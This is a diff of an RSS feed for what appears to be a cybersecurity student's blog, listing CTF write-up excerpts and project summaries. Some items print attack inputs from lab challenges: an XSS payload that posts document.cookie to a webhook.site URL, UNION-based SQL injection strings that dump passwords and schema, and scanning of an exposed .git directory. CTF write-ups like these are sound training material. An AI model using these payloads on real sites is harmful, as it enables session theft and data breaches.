@@ -7,184 +7,126 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-    <lastBuildDate>Mon, 16 Oct 2023 18:48:00 +0200</lastBuildDate><atom:link href="https://morebaconstrips.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 16 Oct 2023 18:48:00 +0200</lastBuildDate>
+    <atom:link href="https://morebaconstrips.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Based Encoding</title>
       <link>https://morebaconstrips.github.io/writeups/web/based_encoding/</link>
       <pubDate>Mon, 16 Oct 2023 18:48:00 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/web/based_encoding/</guid>
-      <description>CTF: Hack.lu CTF 2023
-Based encoding as a service. But can we insert a little tomfoolery? Let&amp;rsquo;s find out.
-Link: https://based.skin
-Files: BASED.zip
-When we open the link, we are prompted to visit a website where we can register or log in.
-After signing up and logging in as a normal user, we can navigate to the /create page. Here, we can input text, and the website will encrypt it and save it in its database.</description>
+      <description>CTF: Hack.lu CTF 2023&#xA;Based encoding as a service. But can we insert a little tomfoolery? Let&amp;rsquo;s find out.&#xA;Link: https://based.skin&#xA;Files: BASED.zip&#xA;When we open the link, we are prompted to visit a website where we can register or log in.&#xA;After signing up and logging in as a normal user, we can navigate to the /create page. Here, we can input text, and the website will encrypt it and save it in its database.</description>
     </item>
-    
     <item>
       <title>Blade Runner</title>
       <link>https://morebaconstrips.github.io/writeups/web/blade_runner/</link>
       <pubDate>Sun, 01 Oct 2023 18:48:00 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/web/blade_runner/</guid>
-      <description>CTF: MapleCTF 2023
-You look lonely. I can fix that.
-Files: blade_runner.zip
-I worked on this challenge locally by running the Docker container provided in the .zip file alongside the source code of the web page.
-This is what the page looks like when visiting the landing page:
-After some experimentation, I discovered that the aim of the challenge was to first register on the website and then log in with the correct credentials in order to open and view the content of the JOI page.</description>
+      <description>CTF: MapleCTF 2023&#xA;You look lonely. I can fix that.&#xA;Files: blade_runner.zip&#xA;I worked on this challenge locally by running the Docker container provided in the .zip file alongside the source code of the web page.&#xA;This is what the page looks like when visiting the landing page:&#xA;After some experimentation, I discovered that the aim of the challenge was to first register on the website and then log in with the correct credentials in order to open and view the content of the JOI page.</description>
     </item>
-    
     <item>
       <title>Eval Me</title>
       <link>https://morebaconstrips.github.io/writeups/forensics/eval_me/</link>
       <pubDate>Mon, 18 Sep 2023 21:14:12 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/forensics/eval_me/</guid>
-      <description>I was trying a beginner CTF challenge and successfully solved it. But it didn&amp;rsquo;t give me the flag. Luckily I have this network capture. Can you investigate?
-Attachment: capture.pcapng
-nc chals.sekai.team 9000 Connecting to the server via nc we get this:
-Welcome to this intro pwntools challenge. I will send you calculations and you will send me the answer Do it 100 times within time limit and you get the flag :) 3 + 7 &amp;gt;&amp;gt;&amp;gt; After noticing that the script require very fast answers I wrote this simple script to automatize the answers:</description>
+      <description>I was trying a beginner CTF challenge and successfully solved it. But it didn&amp;rsquo;t give me the flag. Luckily I have this network capture. Can you investigate?&#xA;Attachment: capture.pcapng&#xA;nc chals.sekai.team 9000 Connecting to the server via nc we get this:&#xA;Welcome to this intro pwntools challenge. I will send you calculations and you will send me the answer Do it 100 times within time limit and you get the flag :) 3 + 7 &amp;gt;&amp;gt;&amp;gt; After noticing that the script require very fast answers I wrote this simple script to automatize the answers:</description>
     </item>
-    
     <item>
       <title>Paprikà - Time Tracking Device</title>
       <link>https://morebaconstrips.github.io/projects/paprika/</link>
       <pubDate>Sun, 17 Sep 2023 23:45:37 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/projects/paprika/</guid>
-      <description>Mar 2023 - Jun 2023
-For an innovation and entrepreneurship university course, my team and I embarked on a journey to conceptualize, design, and develop a revolutionary product known as Paprikà. This innovative device, shaped like a paprika, seamlessly blends the realms of technology, business acumen, and practicality. Our project&amp;rsquo;s focus was divided equally between innovation and business aspects, and the technical competencies required to bring our idea to life, from 3D printing the device to creating a robust platform with integrated APIs.</description>
+      <description>Mar 2023 - Jun 2023&#xA;For an innovation and entrepreneurship university course, my team and I embarked on a journey to conceptualize, design, and develop a revolutionary product known as Paprikà. This innovative device, shaped like a paprika, seamlessly blends the realms of technology, business acumen, and practicality. Our project&amp;rsquo;s focus was divided equally between innovation and business aspects, and the technical competencies required to bring our idea to life, from 3D printing the device to creating a robust platform with integrated APIs.</description>
     </item>
-    
     <item>
       <title>Adversarial Examples Evading deepfake-image detectors with white-box attacks</title>
       <link>https://morebaconstrips.github.io/projects/adversarial/</link>
       <pubDate>Sat, 16 Sep 2023 19:01:48 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/projects/adversarial/</guid>
-      <description>Jan 2023 - Aug 2023
-The project involved conducting in-depth research into potential white and black box attacks on a ResNet50, aiming to significantly reduce the classifier&amp;rsquo;s accuracy to near 0%. Subsequently, white-box attacks were implemented on a ResNet50 model fine-tuned with the TrueFace dataset provided by the University of Trento. The results were remarkable, as we successfully lowered the Neural Network&amp;rsquo;s accuracy from 100% to nearly 0%.</description>
+      <description>Jan 2023 - Aug 2023&#xA;The project involved conducting in-depth research based on Carlini and Farid&amp;rsquo;s paper into potential white and black box attacks on ResNet50, aiming to significantly reduce the classifier&amp;rsquo;s accuracy to near 0%. Subsequently, one of the proposed white-box attacks (a Loss-Maximizing-like attack) was implemented to attack the ResNet50 model fine-tuned with the TrueFace dataset provided by the University of Trento.&#xA;The ultimate goal of the project was to enable ResNet50 to misclassify all the fake images extracted from the database and to make it falsely identify these images as real.</description>
     </item>
-    
     <item>
       <title>Enhancing Thera mental health app: integrating AI-powered safety measures for improved user well-being</title>
       <link>https://morebaconstrips.github.io/projects/thera/</link>
       <pubDate>Sat, 16 Sep 2023 18:59:55 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/projects/thera/</guid>
-      <description>Jul 2023 - Aug 2023
-Our team played a pivotal role in advancing Thera (a Lithuanian mental health app) by integrating AI-driven safety measures. By implementing a carefully designed decision-tree logic and dynamic AI filtering, we ensured that user interactions with the app were guided towards safer outcomes. Our contribution significantly bolstered Thera&amp;rsquo;s commitment to user well-being, offering enhanced support and tailored responses while mitigating potential risks, thereby fostering a safer and more effective mental health journey for every user.</description>
+      <description>Jul 2023 - Aug 2023&#xA;The project was developed by my team, made of five students from different European universities, during our Summer School organized by EIT Digital Master School.&#xA;Our team played a pivotal role in advancing Thera (a Lithuanian mental health app) by integrating AI-driven safety measures. By implementing a carefully designed decision-tree logic and dynamic AI filtering, we ensured that user interactions with the app were guided towards safer outcomes.</description>
     </item>
-    
     <item>
       <title>Git Gud</title>
       <link>https://morebaconstrips.github.io/writeups/web/git_gud/</link>
       <pubDate>Sat, 16 Sep 2023 18:48:00 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/web/git_gud/</guid>
-      <description>I found this nice website that is supposed to help me get better at flag capturing, however, it just tells me to GIT GUD!
-gobuster -u http://ths.eemcs.utwente.nl:33035/ -w ./SecLists/Discovery/Web-Content/common.txt We discover that the .git dir is exposed
-wget -m http://ths.eemcs.utwente.nl:33035/.git/ git ls-files --stage Scraping in the folders we notice the sha1 of a git object in a file called master, so we read the content
-input: git cat-file -p 8ada2d530c7223ac387dd0ca7de781676a451cc3 output: tree c406e4f12544b6c7e193e6d3cecbc01f91256263 parent 3e7eebf4e038cf713fb74a8101d0c4a03325bd78 author Thijs van Ede thijs@ths.</description>
+      <description>I found this nice website that is supposed to help me get better at flag capturing, however, it just tells me to GIT GUD!&#xA;gobuster -u http://ths.eemcs.utwente.nl:33035/ -w ./SecLists/Discovery/Web-Content/common.txt We discover that the .git dir is exposed&#xA;wget -m http://ths.eemcs.utwente.nl:33035/.git/ git ls-files --stage Scraping in the folders we notice the sha1 of a git object in a file called master, so we read the content&#xA;input: git cat-file -p 8ada2d530c7223ac387dd0ca7de781676a451cc3 output: tree c406e4f12544b6c7e193e6d3cecbc01f91256263 parent 3e7eebf4e038cf713fb74a8101d0c4a03325bd78 author Thijs van Ede thijs@ths.</description>
     </item>
-    
     <item>
       <title>Key Genie</title>
       <link>https://morebaconstrips.github.io/writeups/reverse/key_genie/</link>
       <pubDate>Sat, 16 Sep 2023 14:37:02 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/reverse/key_genie/</guid>
-      <description>While exploring an old ruin in the Middle East, you appear to have found a magic lamp! To your disappointment, only a binary file and a URL to a remote server came out after rubbing it. If you can convince the remote genie you know its password, maybe it will give you a flag.
-After spinning up the docker container, you can connect to it using netcat, by executing $ netcat [ip] [port]</description>
+      <description>While exploring an old ruin in the Middle East, you appear to have found a magic lamp! To your disappointment, only a binary file and a URL to a remote server came out after rubbing it. If you can convince the remote genie you know its password, maybe it will give you a flag.&#xA;After spinning up the docker container, you can connect to it using netcat, by executing $ netcat [ip] [port]</description>
     </item>
-    
     <item>
       <title>Nyte Encoding</title>
       <link>https://morebaconstrips.github.io/writeups/misc/nyte_encoding/</link>
       <pubDate>Sat, 16 Sep 2023 14:35:18 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/misc/nyte_encoding/</guid>
-      <description> The byte size of 8 bits was chosen because it is a power of 2, other than that, it is an arbitrary length. Instead, we think that the 9-bit byte, i.e. the nyte is much cooler! The string below is a hexadecimal encoding of our flag represented as ASCII in nytes, can you retrieve the flag?
-2a120a67b371e4e8653997cc2723297cc4332a15066722f9d0d0403717cc4793a194e67d flag = &amp;#39;&amp;#39; hexadecimal = &amp;#39;2a120a67b371e4e8653997cc2723297cc4332a15066722f9d0d0403717cc4793a194e67d&amp;#39; print(&amp;#39;hex:&amp;#39;, hexadecimal) # Transform it into decimal decimal = int(hexadecimal, 16) print(&amp;#39;decimal:&amp;#39;, decimal) # Transform it into binary binary = bin(decimal) print(&amp;#39;binary:&amp;#39;, binary) # Split it into chunks of 9 (instead of 8) sequence = 0 for i in range(len(binary)//9): flag += chr(int(binary[sequence:sequence+9], 2)) sequence += 9 print(flag) </description>
+      <description> The byte size of 8 bits was chosen because it is a power of 2, other than that, it is an arbitrary length. Instead, we think that the 9-bit byte, i.e. the nyte is much cooler! The string below is a hexadecimal encoding of our flag represented as ASCII in nytes, can you retrieve the flag?&#xA;2a120a67b371e4e8653997cc2723297cc4332a15066722f9d0d0403717cc4793a194e67d flag = &amp;#39;&amp;#39; hexadecimal = &amp;#39;2a120a67b371e4e8653997cc2723297cc4332a15066722f9d0d0403717cc4793a194e67d&amp;#39; print(&amp;#39;hex:&amp;#39;, hexadecimal) # Transform it into decimal decimal = int(hexadecimal, 16) print(&amp;#39;decimal:&amp;#39;, decimal) # Transform it into binary binary = bin(decimal) print(&amp;#39;binary:&amp;#39;, binary) # Split it into chunks of 9 (instead of 8) sequence = 0 for i in range(len(binary)//9): flag += chr(int(binary[sequence:sequence+9], 2)) sequence += 9 print(flag) </description>
     </item>
-    
     <item>
       <title>Cookie Cleaner</title>
       <link>https://morebaconstrips.github.io/writeups/misc/cookie_cleaner/</link>
       <pubDate>Sat, 16 Sep 2023 03:37:43 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/misc/cookie_cleaner/</guid>
-      <description>Everyone knows the best part of browsing the internet is the delicious cookies you get from every website you visit. Therefore we have created a special website just for you to get a lot of new cookies. Can you collect all of them before they turn stale? Start the website by clicking the &amp;lsquo;Start Docker container&amp;rsquo; button below!
-Seems like we need to be faster in order not to let the cookie go bad</description>
+      <description>Everyone knows the best part of browsing the internet is the delicious cookies you get from every website you visit. Therefore we have created a special website just for you to get a lot of new cookies. Can you collect all of them before they turn stale? Start the website by clicking the &amp;lsquo;Start Docker container&amp;rsquo; button below!&#xA;Seems like we need to be faster in order not to let the cookie go bad</description>
     </item>
-    
     <item>
       <title>Whistle Blower</title>
       <link>https://morebaconstrips.github.io/writeups/forensics/whistle_blower/</link>
       <pubDate>Sat, 16 Sep 2023 03:31:38 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/forensics/whistle_blower/</guid>
-      <description>While going through some books, Alice found the identity of the whistleblower in their company and was utterly suprised by the name. She needed to inform Eve about it but she didn&amp;rsquo;t know who is watching her emails. So she decided to hide the message in her email to Eve. See if you can figure out who betrayed the company.
-Download: Dear_Eve.txt
-Content of the file:
-Dear Eve, Thank you for your email informing me of your absence.</description>
+      <description>While going through some books, Alice found the identity of the whistleblower in their company and was utterly suprised by the name. She needed to inform Eve about it but she didn&amp;rsquo;t know who is watching her emails. So she decided to hide the message in her email to Eve. See if you can figure out who betrayed the company.&#xA;Download: Dear_Eve.txt&#xA;Content of the file:&#xA;Dear Eve, Thank you for your email informing me of your absence.</description>
     </item>
-    
     <item>
       <title>XSS 1</title>
       <link>https://morebaconstrips.github.io/writeups/web/xss_1/</link>
       <pubDate>Sat, 16 Sep 2023 03:27:05 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/web/xss_1/</guid>
-      <description>The X-treme Sports Society has a forum discussing X-treme sports. They even have a topic on X-treme CTFs where they share flags. This is only available for admin&amp;rsquo;s though, I wonder if we can view it anyway…
-&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt; Let&amp;rsquo;s open a session with webhook in order to steal some cookies
-Webhook.site - Test, process and transform emails and HTTP requests
-&amp;lt;script&amp;gt;fetch(&amp;#39;[https://webhook.site/3351a0cc-7a55-4f44-a01c-469fe72dbd0a](https://webhook.site/3351a0cc-7a55-4f44-a01c-469fe72dbd0a)&amp;#39;, {method: &amp;#39;POST&amp;#39;, body:document.cookie});&amp;lt;/script&amp;gt; forumSessionID=ZWezDhAFdy5+af2Tsw/EkqNiPJjMBFx+mFG2Jhuj2Bk= 💡 Use burp to forward the packet with the sniffed session ID or just change the forumSessionID in inspect page → storage → cookies → forumSessionIDm</description>
+      <description>The X-treme Sports Society has a forum discussing X-treme sports. They even have a topic on X-treme CTFs where they share flags. This is only available for admin&amp;rsquo;s though, I wonder if we can view it anyway…&#xA;&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt; Let&amp;rsquo;s open a session with webhook in order to steal some cookies&#xA;Webhook.site - Test, process and transform emails and HTTP requests&#xA;&amp;lt;script&amp;gt;fetch(&amp;#39;[https://webhook.site/3351a0cc-7a55-4f44-a01c-469fe72dbd0a](https://webhook.site/3351a0cc-7a55-4f44-a01c-469fe72dbd0a)&amp;#39;, {method: &amp;#39;POST&amp;#39;, body:document.cookie});&amp;lt;/script&amp;gt; forumSessionID=ZWezDhAFdy5+af2Tsw/EkqNiPJjMBFx+mFG2Jhuj2Bk= 💡 Use burp to forward the packet with the sniffed session ID or just change the forumSessionID in inspect page → storage → cookies → forumSessionIDm</description>
     </item>
-    
     <item>
       <title>SQL Injection 1</title>
       <link>https://morebaconstrips.github.io/writeups/web/sql_injection_1/</link>
       <pubDate>Fri, 15 Sep 2023 20:48:53 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/writeups/web/sql_injection_1/</guid>
-      <description>Our database contains the grades of some THS admins. Please use login in the docker container to view your grade. Admins can of course also view the flags in the database, luckily we have very secure access credentials.
-email: user@gmail.com password: password&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; UNION SELECT password,email FROM &amp;#39;users&amp;#39;;-- email: user@gmail.com password: password&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; UNION SELECT name,null FROM sqlite_schema;-- email: user@gmail.com password: password&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; UNION SELECT name,NULL FROM PRAGMA_TABLE_INFO(&amp;#34;table_that_definitely_does_not_contain_the_flag&amp;#34;);-- email: user@gmail.</description>
+      <description>Our database contains the grades of some THS admins. Please use login in the docker container to view your grade. Admins can of course also view the flags in the database, luckily we have very secure access credentials.&#xA;email: user@gmail.com password: password&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; UNION SELECT password,email FROM &amp;#39;users&amp;#39;;-- email: user@gmail.com password: password&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; UNION SELECT name,null FROM sqlite_schema;-- email: user@gmail.com password: password&amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; UNION SELECT name,NULL FROM PRAGMA_TABLE_INFO(&amp;#34;table_that_definitely_does_not_contain_the_flag&amp;#34;);-- email: user@gmail.</description>
     </item>
-    
     <item>
       <title>About me</title>
       <link>https://morebaconstrips.github.io/about/</link>
       <pubDate>Fri, 15 Sep 2023 18:51:22 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/about/</guid>
       <description>Hi there! I&amp;rsquo;m Gabriele, a cybersecurity MSc student whose unique blend of skills, coupled with an insatiable curiosity, has led me on a mission to make the online realm a safer place for all. I hold a Bachelor&amp;rsquo;s degree in Linguistics and one in Computer Science, a combination that may seem unexpected, but it perfectly represents my multifaceted approach to problem-solving and my commitment to understanding the intricacies of cybersecurity from various angles.</description>
     </item>
-    
     <item>
       <title>Robust Image Watermarking</title>
       <link>https://morebaconstrips.github.io/projects/image_watermarking/</link>
       <pubDate>Tue, 18 Oct 2022 00:03:57 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/projects/image_watermarking/</guid>
-      <description>Oct 2022 - Dec 2022
-The Robust Image Watermarking is a technique based on Discrete Wavelet Transform (DWT) and All Phase Discrete Cosine Biorthogonal Transform (APDCBT), implemented for the &amp;ldquo;Multimedia Data Security&amp;rdquo; project.
-To read the paper on which this implementation was based, go here.
-Since this project was destined for a final exam, in which we had to implement the most resilient watermarking technique while attacking the others, I also worked on a couple of scripts that implement attacks used with the end goal of ruining the other teams&amp;rsquo; watermarks without compromising the Weighted Peak Signal-to-Noise Ratio (WPSNR).</description>
+      <description>Oct 2022 - Dec 2022&#xA;The Robust Image Watermarking is a technique based on Discrete Wavelet Transform (DWT) and All Phase Discrete Cosine Biorthogonal Transform (APDCBT), implemented for the &amp;ldquo;Multimedia Data Security&amp;rdquo; project.&#xA;To read the paper on which this implementation was based, go here.&#xA;Since this project was destined for a final exam, in which we had to implement the most resilient watermarking technique while attacking the others, I also worked on a couple of scripts that implement attacks used with the end goal of ruining the other teams&amp;rsquo; watermarks without compromising the Weighted Peak Signal-to-Noise Ratio (WPSNR).</description>
     </item>
-    
     <item>
       <title>A Robust Fingerprint Data Encryption Technique for High Security Applications</title>
       <link>https://morebaconstrips.github.io/projects/thesis/</link>
       <pubDate>Sat, 17 Sep 2022 18:57:26 +0200</pubDate>
-      
       <guid>https://morebaconstrips.github.io/projects/thesis/</guid>
-      <description>Feb 2022 - Jul 2022
-Project about biometric encryption for my bachelor thesis. I have developed an efficient algorithm for fingerprint recognition and matching. This algorithm served as the foundation of my research, which entails the implementation of a fast and highly secure algorithm of encryption and decryption using Shamir&amp;rsquo;s Secret Sharing scheme.
-Image Processing The first part of the algorithm provides a sequence of operations aimed at making the input image as clear and legible as possible, in order to facilitate the minutiae extraction process.</description>
+      <description>Feb 2022 - Jul 2022&#xA;Project about biometric encryption for my bachelor thesis. I have developed an efficient algorithm for fingerprint recognition and matching. This algorithm served as the foundation of my research, which entails the implementation of a fast and highly secure algorithm of encryption and decryption using Shamir&amp;rsquo;s Secret Sharing scheme.&#xA;Image Processing The first part of the algorithm provides a sequence of operations aimed at making the input image as clear and legible as possible, in order to facilitate the minutiae extraction process.</description>
     </item>
-    
+    <item>
+      <title>Epidemiological Simulator</title>
+      <link>https://morebaconstrips.github.io/projects/epidemiological_simulator/</link>
+      <pubDate>Sun, 28 Jun 2020 21:39:15 +0100</pubDate>
+      <guid>https://morebaconstrips.github.io/projects/epidemiological_simulator/</guid>
+      <description>Mar 2020 - Jun 2020&#xA;The “Epidemiological Simulator” is a Java program designed to simulate the spread of infectious diseases within different populations. This interactive and educational tool allows users to explore various scenarios and strategies for managing epidemics. Whether you’re interested in modeling the dynamics of a well-known virus like COVID-19 or creating custom scenarios with different parameters, this program offers a flexible platform for experimentation.&#xA;Key Features: Educational Tool: This program serves has been an educational tool for understanding and applying in real world scenarios OOP concepts, such as inheritance, polymorphism, encapsulation, and abstraction.</description>
+    </item>
   </channel>
 </rss>
